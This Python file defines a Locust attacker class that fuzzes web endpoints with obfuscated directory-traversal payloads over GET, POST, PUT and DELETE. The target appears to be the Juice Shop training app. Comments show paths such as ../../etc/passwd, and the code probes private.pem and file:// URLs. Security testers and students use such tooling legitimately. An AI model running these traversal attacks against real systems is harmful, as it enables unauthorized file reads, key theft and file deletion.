# locust_tests/attackers/directory_traversal.py
import random
from locust import task

from ..base_attacker import BaseAttacker
from ..payload_generators.directory_traversal import DirectoryTraversalPayloadGenerator
from ..obfuscators import PayloadObfuscator # Needed for direct path obfuscation
from ..config import AppConfig # Needed for common query params, endpoints

class DirectoryTraversalAttacker(BaseAttacker):
    """
    Simulates a user attempting Directory Traversal (Path Traversal) attacks using dynamically generated payloads.
    """
   
    def _send_dt_request(self, method, endpoint_key, path_format_args=None, params=None, data=None, name_suffix=""):
        """Wrapper for _send_request specifically for Directory Traversal payloads."""
        self._send_request(
            method,
            endpoint_key,
            path_format_args=path_format_args,
            params=params,
            data=data,
            name_suffix=name_suffix,
            #payload_type_checker=DirectoryTraversalPayloadGenerator.is_dt_payload # Pass the DT specific checker
        )

    
    @task(5)
    def path_traversal_get_fuzzing(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()
        # Choose an endpoint that might take a file path or resource identifier
        target_endpoint_key = random.choice(["file_download", "image_loader", "product_details"])
        param = random.choice(AppConfig.COMMON_QUERY_PARAMS) # Common query params like 'file', 'path', 'id', 'name'

        # Attempt 1: Payload in query parameter
        self._send_dt_request(
            "get",
            target_endpoint_key,
            params={param: payload},
            name_suffix="DT_GET_QUERY"
        )

        # Attempt 2: Payload directly in a path segment (requires careful formatting)
        # For this, we apply obfuscation directly to the payload before formatting the path.
        
        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None

        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload_path = obfuscator_method(payload) if obfuscator_method else payload

        # Example: "/images/{filename}" or "/download/{file}"
        # This assumes the endpoint itself has a path parameter that can be fuzzed
        # If product_details is chosen, it's typically /api/Products/{id}, so injecting DT there is different.
        # Let's use more appropriate endpoints for direct path injection.
        direct_path_endpoints = {
            "ftp_access": "path", # /ftp/{path}
            "encryption_keys_access": "file", # /encryptionkeys/{file}
            "assets_access": "file", # /assets/{file}
            "product_image_endpoint": "product_id" # /rest/product/{product_id}/image
        }
        direct_target_key = random.choice(list(direct_path_endpoints.keys()))
        path_param_name = direct_path_endpoints[direct_target_key]


        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES) 
        # For product_image_endpoint, the payload would be part of the product_id or a sub-path
        if direct_target_key == "product_image_endpoint":
            # Example: /rest/product/1/image/../../../../etc/passwd
            # We'll inject into the 'image' part of the path, or a sub-path
            self.client.get(
                AppConfig.ENDPOINTS[direct_target_key].format(product_id=random.randint(1,20)) + f"/{obfuscated_payload_path}",
                name=f"{AppConfig.ENDPOINTS[direct_target_key]}/[DT_GET_PATH_INJECT_{self.obfuscation_strategy.upper()}]"
            )
        else:
            # For endpoints like /ftp/{path}, /encryptionkeys/{file}, /assets/{file}
            self._send_dt_request(
                "get",
                direct_target_key,
                path_format_args={path_param_name: obfuscated_payload_path},
                name_suffix="DT_GET_PATH_INJECT"
            )


    @task(2)
    def path_traversal_post_fuzzing(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        # Target 1: Feedback with a hypothetical attachment_path field
        self._send_dt_request(
            "post",
            "feedbacks",
            data={"comment": "Test with path traversal in attachment field", "attachment_path": payload},
            name_suffix="DT_FEEDBACK_POST_ATTACHMENT"
        )

        # Target 2: Complaint file upload - injecting DT into filename or path
        # This assumes the 'complaint' endpoint takes a filename in the body or query
        self._send_dt_request(
            "post",
            "complaints",
            data={"title": "DT Complaint", "filename": payload}, # Hypothetical filename field
            name_suffix="DT_COMPLAINT_POST_FILENAME"
        )

        # Target 3: Profile image URL upload (SSRF with DT potential)
        # If the URL is processed to fetch a local file, DT can occur
        malicious_url = f"file:///{payload}" # Attempting file:// protocol for DT
        self._send_dt_request(
            "post",
            "profile_image_url_upload",
            data={"image": malicious_url},
            name_suffix="DT_PROFILE_IMAGE_URL_POST"
        )


    @task(1)
    def path_traversal_put_fuzzing(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None
        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload = obfuscator_method(payload) if obfuscator_method else payload

        # Target 1: Hypothetical PUT endpoint for file modification/creation
        # This assumes an endpoint like /upload/{filename} where filename can be traversed
        # We'll use a generic /upload path if not explicitly in AppConfig
        self.client.put(
            f"/upload/{obfuscated_payload}/test.txt", # Example: /upload/../../etc/passwd/test.txt
            data=b"malicious content",
            name=f"/upload/[PUT_PATH_TRAVERSAL_FILENAME_{self.obfuscation_strategy.upper()}]"
        )

        # Target 2: Update an address, injecting DT into a field that might be used for file ops
        self._send_dt_request(
            "put",
            "address",
            path_format_args={"address_id": random.randint(1,10)}, # Legitimate address ID
            data={"streetAddress": f"New Street {payload}"}, # Injecting into an address field
            name_suffix="DT_ADDRESS_UPDATE_PUT"
        )


    @task(1)
    def path_traversal_delete_fuzzing(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        # Target 1: Delete a file via a query parameter (e.g., /delete?file=../../etc/passwd)
        # This is a common pattern for file deletion vulnerabilities.
        # Assuming a hypothetical 'delete_file' endpoint or using 'file_download' as a proxy for a file handler.
        # If 'file_download' is only GET, this won't work as DELETE.
        # Let's use a more plausible endpoint if available, or make it clear it's a hypothetical DELETE target.
        # For Juice Shop, a direct DELETE for arbitrary files is less common, but possible for specific challenges.
        self._send_dt_request(
            "delete",
            "complaint", # Assuming a complaint can be deleted by path/filename
            path_format_args={"complaint_id": f"malicious_file_{payload}.txt"}, # Inject into ID/filename
            name_suffix="DT_COMPLAINT_DELETE_PATH"
        )
        self._send_dt_request(
            "delete",
            "memory_detail", # Memories might be stored as files
            path_format_args={"id": f"image_{payload}.png"},
            name_suffix="DT_MEMORY_DELETE_PATH"
        )




    @task(3)
    def path_traversal_ftp_access(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None
        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload = obfuscator_method(payload) if obfuscator_method else payload

        # Accessing files within the FTP directory or traversing out of it
        # Example: /ftp/../../etc/passwd
        self._send_dt_request(
            "get",
            "ftp_access",
            path_format_args={"path": obfuscated_payload},
            name_suffix="DT_FTP_ACCESS"
        )
        # Try specific files within FTP for known challenges
        self._send_dt_request(
            "get",
            "ftp_access",
            path_format_args={"path": f"../{obfuscated_payload}coupons_2018.pdf"}, # Injecting into a known file path
            name_suffix="DT_FTP_ACCESS_KNOWN_FILE"
        )


    @task(2)
    def path_traversal_encryption_keys_access(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None
        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload = obfuscator_method(payload) if obfuscator_method else payload

        # Accessing encryption keys or traversing out of the directory
        # Example: /encryptionkeys/../../etc/passwd
        self._send_dt_request(
            "get",
            "encryption_keys_access",
            path_format_args={"file": obfuscated_payload},
            name_suffix="DT_ENCRYPTION_KEYS_ACCESS"
        )
        # Try specific key files
        self._send_dt_request(
            "get",
            "encryption_keys_access",
            path_format_args={"file": f"../{obfuscated_payload}private.pem"}, # Injecting into a known file path
            name_suffix="DT_ENCRYPTION_KEYS_KNOWN_FILE"
        )


    @task(2)
    def path_traversal_admin_file_system_challenge(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()
        # This endpoint is specifically for a challenge
        self._send_dt_request(
            "get",
            "file_system_access_challenge",
            params={"file": payload}, # Assuming it takes a 'file' query parameter
            name_suffix="DT_ADMIN_FILE_SYSTEM_QUERY"
        )
        # Also try injecting directly into the path if the endpoint allows

        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None
        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload = obfuscator_method(payload) if obfuscator_method else payload

        self.client.get(
            f"{AppConfig.ENDPOINTS['file_system_access_challenge']}/{obfuscated_payload}",
            name=f"{AppConfig.ENDPOINTS['file_system_access_challenge']}/[DT_ADMIN_FILE_SYSTEM_PATH_{self.obfuscation_strategy.upper()}]"
        )


    @task(1)
    def path_traversal_data_export_fuzzing(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()
        # This endpoint might take a filename or path for export location
        self._send_dt_request(
            "get",
            "data_export_endpoint",
            params={"filename": payload}, # Hypothetical 'filename' parameter
            name_suffix="DT_DATA_EXPORT_QUERY"
        )
        self._send_dt_request(
            "post", # Data export might be a POST
            "data_export_endpoint",
            data={"exportPath": payload}, # Hypothetical 'exportPath' in JSON body
            name_suffix="DT_DATA_EXPORT_POST"
        )

    @task(1)
    def path_traversal_download_file_by_id(self):
        # Some applications use IDs that map to file paths internally.
        # If the ID can be manipulated to a DT payload, it's vulnerable.
        file_id_base = random.randint(1, 100)
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()
        # Assuming 'file_download' can take a file ID that might be vulnerable
        self._send_dt_request(
            "get",
            "file_download", # Assuming this endpoint handles file IDs or names
            params={"id": f"{file_id_base}{payload}"},
            name_suffix="DT_FILE_DOWNLOAD_ID"
        )
        self._send_dt_request(
            "get",
            "file_download",
            params={"name": f"report_{file_id_base}_{payload}.pdf"}, # Injecting into a filename
            name_suffix="DT_FILE_DOWNLOAD_NAME"
        )

    @task(1)
    def path_traversal_assets_access(self):
        payload = DirectoryTraversalPayloadGenerator.get_random_dt_payload()

        self.obfuscation_strategy = random.choice(BaseAttacker.OBFUSCATION_CHOICES)
        obfuscator_method = None
        if self.obfuscation_strategy == "single":
            obfuscator_method = PayloadObfuscator.apply_random_obfuscation
        elif self.obfuscation_strategy == "double":
            obfuscator_method = PayloadObfuscator.apply_two_random_obfuscations

        obfuscated_payload = obfuscator_method(payload) if obfuscator_method else payload

        # Accessing static assets, attempting to traverse
        # Example: /assets/css/../../etc/passwd
        self._send_dt_request(
            "get",
            "assets_access",
            path_format_args={"file": f"css/{obfuscated_payload}"}, # Injecting into a sub-path
            name_suffix="DT_ASSETS_ACCESS"
        )
        self._send_dt_request(
            "get",
            "assets_access",
            path_format_args={"file": obfuscated_payload}, # Direct injection
            name_suffix="DT_ASSETS_ACCESS_DIRECT"
        )